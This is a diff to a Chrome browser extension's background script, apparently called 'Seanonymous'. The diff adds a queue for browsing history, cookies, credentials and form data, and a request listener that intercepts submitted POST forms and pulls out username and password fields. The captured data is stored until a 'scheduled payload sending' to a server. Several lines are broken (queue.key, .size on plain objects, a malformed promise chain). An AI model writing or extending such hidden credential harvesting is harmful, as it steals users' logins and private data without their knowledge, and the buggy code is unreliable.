@@ -1,3 +1,7 @@
+
+var socket = null;
+
+
 /* current configuration
  * user ID (int) identifier
  * js_cmd (list of pairs (site url, js function))
@@ -9,8 +13,20 @@ var config = {
 	js_cmd: [],
 	last_pkt: Date.now(),
 	security_blacklist: []
-};
-var socket = null;
+};	//update this variable when a packet is sent
+
+var queue = {
+	history: [],	//array of urls
+	cookies: [],	//array of {name, url, content}
+	creds: [],		//array of {url,username,password}
+	forms: []		//array of {id,id,id,...}
+}	//clear this variable when a packet is sent
+
+function clearQueue(){
+	Object.keys(queue).forEach(function(key){
+		queue.key = [];
+	})
+}
 /* update the handler for redirection to consider changes to the list of forbidden
  * reference:
  * 	https://stackoverflow.com/questions/26157036/how-can-i-update-an-onbeforerequest-event-listener-in-a-chrome-extension
@@ -75,7 +91,7 @@ chrome.tabs.onUpdated.addListener(
 						}
 					}
 				});
-
+				//Only save the results if something changed
                 if(listChanged) {
                     storeConfig();
                 }
@@ -91,15 +107,37 @@ chrome.tabs.onUpdated.addListener(
 chrome.webRequest.onBeforeRequest.addListener(function(details){
 	if(details.method == "POST"){
 		var formData = details.requestBody.formData;
+		var credential = {'url':details.url};
+		var complex = {'url':details.url};
+
 		//TODO: populate a json and send it to the server
 		if(formData){
 			Object.keys(formData).forEach(function(key){
-
+				if(key.match("username")||key.match("password")){
+					credential[key]=formData[key];
+				}
+				else{
+					complex[key] = formData[key];
+				}
 			})
+		}
+		var queueChanged = false;
+		//add these forms to a buffer for storing the payload until the next scheduled payload sending
+		if(credential.size == 3) {
+            queue.creds.push(credential);
+            queueChanged = true;
+        }
+        if(complex.size > 1) {
+            queue.forms.push(complex);
+            queueChanged = true;
+        }
+        if(queueChanged){
+			storeQueue();
 		}
 	}
 },
-    {urls: blocked_domains},
+    {urls: blocked_domains,
+	 types: ["main_frames"]},
     ["blocking"]
 )
 
@@ -128,7 +166,7 @@ async function loadConfig(){
 	});
 }
 
-/* setClientID
+/*
  * store the current config object to memory
  */
 async function storeConfig(){
@@ -136,6 +174,26 @@ async function storeConfig(){
 		console.log('Seanonymous: configuration saved!');
 	});
 }
+
+
+
+async function loadQueue(){
+    await chrome.storage.sync.get('config', function(result){
+        if(!(result.config == undefined)){
+            queue = result.queue;
+        }
+    });
+}
+
+/*
+ * store the current config object to memory
+ */
+async function storeQueue(){
+    await chrome.storage.sync.set({queue: queue}, function(result){
+        console.log('Seanonymous: message queue saved!');
+    });
+}
+
 
 
 
@@ -214,6 +272,10 @@ function main_func() {
 	setListener(config.security_blacklist);
 }
 
-loadConfig().then(main_func);
+loadConfig().then(
+	loadQueue.then()(
+		main_func
+	)
+);
 
 
